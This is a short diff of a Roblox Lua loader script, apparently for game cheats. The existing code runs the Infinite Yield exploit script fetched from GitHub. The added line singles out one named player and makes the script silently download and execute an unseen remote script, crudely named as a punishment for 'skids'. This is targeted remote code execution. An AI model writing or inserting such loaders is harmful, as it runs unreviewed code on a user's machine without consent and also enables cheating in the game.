@@ -1,4 +1,5 @@
 if game.Players.LocalPlayer.Name == "lhhi65" then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/gayloo/testscripts/skidfucker.lua"))();
   return
 end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();
